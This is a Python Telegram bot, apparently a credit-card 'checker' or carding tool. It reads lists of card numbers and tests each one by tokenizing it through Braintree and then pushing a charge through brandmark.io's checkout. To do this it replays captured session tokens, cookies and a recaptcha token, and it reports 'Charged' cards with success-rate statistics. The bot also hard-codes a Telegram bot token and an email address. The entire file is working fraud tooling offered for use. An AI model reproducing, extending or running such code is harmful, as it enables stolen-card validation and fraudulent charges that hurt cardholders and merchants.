import os
import time
import asyncio
import requests
import aiofiles
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram import InlineKeyboardButton, InlineKeyboardMarkup

# Global variables to track checking state and stats
checking_active = False
stats = {
    'approved': 0,
    'declined': 0,
    'checked': 0,
    'total': 0,
    'start_time': 0
}

# API function to tokenize a credit card using Braintree
def b3req(cc, mm, yy):
    headers = {
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDE4ODk2MTksImp0aSI6ImZlZGUxMTBlLTE1OGYtNDYwMC05MTYyLTM0NWExYzJkODEzMSIsInN1YiI6ImZ6anc5bXIyd2RieXJ3YmciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZ6anc5bXIyd2RieXJ3YmciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319._zDtTZMq4h-cjrlT93BEn6KVlYnr1SHDycXSX7QW_NO4WeWkg8pTj54ZlzJ08jeHqBxoXrm428GNfZbmvxJ7yQ',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    }
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'dropin2',
            'sessionId': 'fab6924a-b151-43b5-a68a-0ff870cab793',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': f'{cc}',
                    'expirationMonth': f'{mm}',
                    'expirationYear': f'{yy}',
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    try:
        resjson = response.json()
    except requests.exceptions.JSONDecodeError:
        return None, None, None, None, None, None, None
    if 'data' not in resjson or not resjson['data']:
        return None, None, None, None, None, None, None
    try:
        tkn = resjson['data']['tokenizeCreditCard']['token']
        mm = resjson["data"]["tokenizeCreditCard"]["creditCard"]["expirationMonth"]
        yy = resjson["data"]["tokenizeCreditCard"]["creditCard"]["expirationYear"]
        bin = resjson["data"]["tokenizeCreditCard"]["creditCard"]["bin"]
        card_type = resjson["data"]["tokenizeCreditCard"]["creditCard"]["brandCode"]
        lastfour = resjson["data"]["tokenizeCreditCard"]["creditCard"]["last4"]
        lasttwo = lastfour[-2:]
        return tkn, mm, yy, bin, card_type, lastfour, lasttwo
    except KeyError:
        return None, None, None, None, None, None, None

# API function to process a payment using Brandmark
def brainmarkreq(b3tkn, mm, yy, bin, Type, lastfour, lasttwo):
    cookies2 = {
        '_ga': 'GA1.2.1451620456.1741715570',
        '_gid': 'GA1.2.354116258.1741803158',
        '_gat': '1',
        '_ga_93VBC82KGM': 'GS1.2.1741803158.2.1.1741803214.0.0.0',
    }
    headers2 = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://app.brandmark.io',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://app.brandmark.io/v3/',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    }
    json_data2 = {
        'tier': 'basic',
        'email': 'electraop09@gmail.com',
        'payload': {
            'nonce': f'{b3tkn}',
            'details': {
                'expirationMonth': f'{mm}',
                'expirationYear': f'{yy}',
                'bin': f'{bin}',
                'cardType': f'{Type}',
                'lastFour': f'{lastfour}',
                'lastTwo': f'{lasttwo}',
            },
            'type': 'CreditCard',
            'description': 'ending in 82',
            'deviceData': '{"device_session_id":"c88fc259a79674be1f35baf6865f6158","fraud_merchant_id":null,"correlation_id":"e526db6e61b97522af1c8f5a2b2433df"}',
            'binData': {
                'prepaid': 'Yes',
                'healthcare': 'No',
                'debit': 'Yes',
                'durbinRegulated': 'No',
                'commercial': 'Unknown',
                'payroll': 'No',
                'issuingBank': 'THE BANCORP BANK NATIONAL ASSOCIATION',
                'countryOfIssuance': 'USA',
                'productId': 'MPF',
            },
        },
        'discount': False,
        'referral': None,
        'params': {
            'id': 'logo-60bfb4e5-5cfb-4c13-a8bf-689d41d922e6',
            'title': 'FnNetwork',
        },
        'svg': '</svg>\n',
        'recaptcha_token': '03AFcWeA4Xq3x3P5oV3a2n_hx_ENOzsKm6LexhEAWRQGuPQpBfDMfxihyXZrVUMdNxweI7t4PZgocW8KGl_YPEUoDVfLaQ6s5suEekbCxMMASdl1d8Dts69GCHH4BFQWC6kyD59y7oiufVOM-REhg7Xna8QhXRpnIjU4gjjhaDuMO4A2xnw6LiSoLtD4B1E4bp5hUCI5kgwpzd2C3XiITUphENSwwANDrhvjam_qmsODBTRQGnxBnIcY-RDv7coZrLVKTTj8dQDZ12FVScFqeMvSggT8Di0gar3DPltn5eKx9V0yyLrTj1aDobn-551Y95PfhAKXRXm1u8SOr-HPAqFENTWdDRKRuzaSUSasCppXKykihYdvfaWz14pt90MDXYoESzJKuKpTQENm_QiIID7Dx8zOlDqdKdEch44bw_2wis_pkUNeqIX8irri-rILLmybf7kzLEiO7NUAC5uxGnyyXl3qMe36S2ncbXkhhB4ZYZ-uMSvb4qPuPrpuZ3XjkwhRJ_F7rGXH1GqFTbe6bi7Gh-UFhH0XzjZnpIvMmY2emtxfjkHAyWFN9RgsX3Zpke-Sbgnp9Zk8tlPii_WmklLgVFolOTrmKNi9xrYT4D0fLx7BLVUnCmecpcRaqQLUsllhHDwG_QIGzI6C9e-ryiSH2QNSGBQcjZu4SKyu2oc2HblrIoJpkXrIrn72A3S5AyAtY1IxY7yDo4FvsYmvv9S1qxsze3nTMvjQFRzmbI1IdNJ0e9ochzGSs6sy39Ha4wavYIg5vDA2NS6C3mQL3qaDykwEKnn2fQUKYAkzRPAN2rZuaxYKvv2ksIpmxa9sSvW3RjzNp5X8oHQzvlCVsylw5IXZH_H0Bqj4mvAAEmioEripqmuxyvcM_l0JGZkbvRPZw_Raa4K3Mdo8hen2qOckzvdHztYBXDAVjO1xWp6D2kMmgzP3_ndS-2CZQtyVozM_Wz2b2HxiCSW7GP__IVyLRI1dEPOJVlqVplELzdZyAZOmHm_rDJsqRnb7t8BTmcPemm0PTS8xWDtuSDtp_4YYjW8to2-a8NR6CGciladI29gCDbrwsYOf78fb-MFrUCV2U1joc95ot3oLiQK_nznrYwNHNxTTySR4SQyz-ERQcbR_7uPFaHgCoPRr_fc5fZ8qAdszTkJcswaH1wntPdq905m_pFQEOMNLI2BI1dpkiCSLvDKqB6WE9By4-KUbbVKh-WM8sjAfqICUF1EUE9cRVwYNp8AXnSvRqJJ9ywHBiG5bbIp-T9RqWZ7V3Suzg2GaktjyCyUbwNERgyhyqz487W9UBDz-i4TYkw2MXuUa8blsa_8-tEzORIyeIpEaDZxUumdzFOkmdndlBUTWo4GjDQMXaZBst8mSH3ljQFK2D67ogTuB_hiRcbvhOAB7NMXn2K-HcbLIZmxJwQ_m6PSG92NkSZwMapee3pO2WwSj58qK7XqR-du9orKCDAt0U7SFafTFdRzWzdBN9L5yqf6QHu_k1yja0AAVSFoTaW1vg8Ejp-sQ0bdu9AWinMgvyVEuVIMjDXiywYUe6xuCfR_pCQWRuxzc7PespUccQYKsh7tfDDjh_1hyg9kSVPIt58oEnghn5MA9l8VTw6zht7HazLL7zi6tWtCBisIVsIkioaPaSFCSAj-9vL6gF0U9mD1cvFs_l-QnHRh9NsMw0pBu6DVvDmv1eHd0Cp3K-ppp9Q3w8LYokqZoEL5iWMz72d-59_hYzLx16b7IoIIZwEci2kaZmj5ar3VQi9GxMnMbXZwxgJc6J36_Ttzsns6VsW9PFJyRvMruxa1QdJi0mQwF047W9k0UnUPe95IqsXgjqnXWqp7yRfvt_7GhLlvlpDCpX8APsizJTAvnobXwgVw62oFFmlrL64ahF384SzrRK3ciD-TzZzaxl-Y3rBYorDWkoxHXeH21kQMw3bkbSTsSmtlgjzdlEXSNj2xznfpt9ribJ7wzdlzig8fGHwVlkIVa4_cU-_H2D35NyxLyoL-CrbaOeWnMgv2JeXAGRFEWnum4gcGUqsAECnoT4JhBLTj4ECk3NgfxvpYLuTLxiZt6ZbCHVI1EPEOpHXGSCWblvMSMhgEqkamyU',
        'token': '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',
    }
    response2 = requests.post('https://app.brandmark.io/v3/charge.php', cookies=cookies2, headers=headers2, json=json_data2)
    try:
        res2json = response2.json()
        return res2json['message']
    except (requests.exceptions.JSONDecodeError, KeyError):
        return "Error: Invalid API response"

# Helper function to run synchronous functions in an async context
async def run_sync_func(func, *args):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, func, *args)

# Check if a card was successfully charged based on the API response
def is_charged(message):
    return "success" in message.lower()

# Process a text file containing card details
async def process_file(file_path, update: Update, context: ContextTypes.DEFAULT_TYPE):
    global checking_active, stats
    checking_active = True
    stats['start_time'] = time.time()
    stats['total'] = 0
    stats['checked'] = 0
    stats['approved'] = 0
    stats['declined'] = 0

    # Read all lines from the file
    lines = []
    async with aiofiles.open(file_path, 'r') as f:
        async for line in f:
            lines.append(line.strip())
    stats['total'] = len(lines)
    if stats['total'] == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="File is empty!")
        checking_active = False
        return

    for line in lines:
        if not checking_active:
            break
        if '|' not in line or len(line.split('|')) != 4:
            continue
        card_number, expiry_month, expiry_year, _ = line.split('|')
        tkn, mm, yy, bin, card_type, lastfour, lasttwo = await run_sync_func(b3req, card_number, expiry_month, expiry_year)
        if tkn is None:
            continue
        final = await run_sync_func(brainmarkreq, tkn, mm, yy, bin, card_type, lastfour, lasttwo)
        stats['checked'] += 1
        if is_charged(final):
            stats['approved'] += 1
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"<b>Charged✅</b> {card_number}", parse_mode='HTML')
        else:
            stats['declined'] += 1
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"{final} {card_number}")

        if stats['checked'] % 50 == 0 or stats['checked'] == stats['total']:
            duration = time.time() - stats['start_time']
            avg_speed = stats['checked'] / duration if duration > 0 else 0
            success_rate = (stats['approved'] / stats['checked'] * 100) if stats['checked'] > 0 else 0
            progress_message = f"""
<b>[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐋𝐈𝐕𝐄 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 😈⚡</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝:</b> {stats['approved']}
<b>[✪] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝:</b> {stats['declined']}
<b>[✪] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝:</b> {stats['checked']}/{stats['total']}
<b>[✪] 𝐓𝐨𝐭𝐚𝐥:</b> {stats['total']}
<b>[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧:</b> {duration:.2f} seconds
<b>[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝:</b> {avg_speed:.2f} cards/sec
<b>[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞:</b> {success_rate:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
<b>[み] 𝐃𝐞𝐯: @FNxELECTRA ⚡😈</b>
━━━━━━━━━━━━━━━━━━━━━━
"""
            await context.bot.send_message(chat_id=update.effective_chat.id, text=progress_message, parse_mode='HTML')
    
    checking_active = False

# Handle document uploads (text files with card details)
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("Please send a .txt file.")
        return
    file = await document.get_file()
    os.makedirs('temp', exist_ok=True)
    file_path = os.path.join('temp', document.file_name)
    await file.download_to_drive(file_path)
    await update.message.reply_text("✅ File received! Starting checking...\n⚡ Progress will be updated every 50 cards")
    await process_file(file_path, update, context)

# Handle /chk command for checking a single card
async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /chk <cc|mm|yy|cvv>")
        return
    cc_input = context.args[0]
    if '|' not in cc_input or len(cc_input.split('|')) != 4:
        await update.message.reply_text("Invalid format. Use: /chk cc|mm|yy|cvv")
        return
    card_number, expiry_month, expiry_year, _ = cc_input.split('|')
    tkn, mm, yy, bin, card_type, lastfour, lasttwo = await run_sync_func(b3req, card_number, expiry_month, expiry_year)
    if tkn is None:
        await update.message.reply_text("Error processing card.")
        return
    final = await run_sync_func(brainmarkreq, tkn, mm, yy, bin, card_type, lastfour, lasttwo)
    if is_charged(final):
        await update.message.reply_text(f"<b>Charged✅</b> {card_number}", parse_mode='HTML')
    else:
        await update.message.reply_text(f"{final} {card_number}")

# Handle /mchk command for checking multiple cards
async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global checking_active, stats
    message_text = update.message.text
    lines = message_text.split('\n')[1:]  # Skip the /mchk line
    if not lines:
        await update.message.reply_text("Usage: /mchk\n<cc1|mm|yy|cvv>\n<cc2|mm|yy|cvv>...")
        return
    checking_active = True
    stats['start_time'] = time.time()
    stats['total'] = len(lines)
    stats['checked'] = 0
    stats['approved'] = 0
    stats['declined'] = 0

    for line in lines:
        if not checking_active:
            break
        line = line.strip()
        if not line or '|' not in line or len(line.split('|')) != 4:
            continue
        card_number, expiry_month, expiry_year, _ = line.split('|')
        tkn, mm, yy, bin, card_type, lastfour, lasttwo = await run_sync_func(b3req, card_number, expiry_month, expiry_year)
        if tkn is None:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Error processing {card_number}")
            continue
        final = await run_sync_func(brainmarkreq, tkn, mm, yy, bin, card_type, lastfour, lasttwo)
        stats['checked'] += 1
        if is_charged(final):
            stats['approved'] += 1
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"<b>Charged✅</b> {card_number}", parse_mode='HTML')
        else:
            stats['declined'] += 1
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"{final} {card_number}")

        if stats['checked'] % 50 == 0 or stats['checked'] == stats['total']:
            duration = time.time() - stats['start_time']
            avg_speed = stats['checked'] / duration if duration > 0 else 0
            success_rate = (stats['approved'] / stats['checked'] * 100) if stats['checked'] > 0 else 0
            progress_message = f"""
<b>[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐋𝐈𝐕𝐄 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 😈⚡</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝:</b> {stats['approved']}
<b>[✪] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝:</b> {stats['declined']}
<b>[✪] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝:</b> {stats['checked']}/{stats['total']}
<b>[✪] 𝐓𝐨𝐭𝐚𝐥:</b> {stats['total']}
<b>[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧:</b> {duration:.2f} seconds
<b>[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝:</b> {avg_speed:.2f} cards/sec
<b>[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞:</b> {success_rate:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
<b>[み] 𝐃𝐞𝐯: @FNxELECTRA ⚡😈</b>
━━━━━━━━━━━━━━━━━━━━━━
"""
            await context.bot.send_message(chat_id=update.effective_chat.id, text=progress_message, parse_mode='HTML')
    
    checking_active = False

# Handle /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📤 Upload Combo", callback_data='upload_combo')],
        [InlineKeyboardButton("⏹️ Cancel Check", callback_data='cancel_check')],
        [InlineKeyboardButton("📊 Live Stats", callback_data='live_stats')],
        [InlineKeyboardButton("? Help", callback_data='help')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔥 Welcome To FN MASS CHR BOT! 🔥\n"
        "🔍 Use /chk To Check Single CC\n"
        "📤 Send Combo File Or Else Use Button Below:",
        reply_markup=reply_markup
    )

# Handle button clicks
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global checking_active
    query = update.callback_query
    await query.answer()

    if query.data == 'upload_combo':
        await query.edit_message_text("📤 Please upload your combo file (.txt)")
    elif query.data == 'cancel_check':
        checking_active = False
        await query.edit_message_text("⏹️ Checking cancelled!🛑")
    elif query.data == 'live_stats':
        duration = time.time() - stats['start_time'] if stats['start_time'] > 0 else 0
        avg_speed = stats['checked'] / duration if duration > 0 else 0
        success_rate = (stats['approved'] / stats['checked'] * 100) if stats['checked'] > 0 else 0
        stats_message = f"""
━━━━━━━━━━━━━━━━━━━━━━
[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐒𝐓𝐀𝐓𝐈𝐂𝐒 😈⚡
━━━━━━━━━━━━━━━━━━━━━━
[✪] 𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {stats['approved']}
[❌] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']}
[✪] 𝐓𝐨𝐭𝐚𝐥: {stats['total']} 
[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration:.2f} seconds
[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {avg_speed:.2f} cards/sec
[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: {success_rate:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
[み] 𝐃𝐞𝐯: @FNxELECTRA ⚡😈
━━━━━━━━━━━━━━━━━━━━━━
"""
        await query.edit_message_text(stats_message)
    elif query.data == 'help':
        await query.edit_message_text("Help: Use /chk <cc|mm|yy|cvv> for single check or upload a .txt file with combos.")

# Handle /stop command
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global checking_active
    checking_active = False
    await update.message.reply_text("⏹️ Process Stopped!🛑")

# Main bot setup and execution
if __name__ == '__main__':
    app = ApplicationBuilder().token('7748515975:AAHyGpFl4HXLLud45VS4v4vMkLfOiA6YNSs').build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(CommandHandler("mchk", mchk))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.Command(), start))  # Fallback for commands
    app.add_handler(CallbackQueryHandler(button))
    app.run_polling()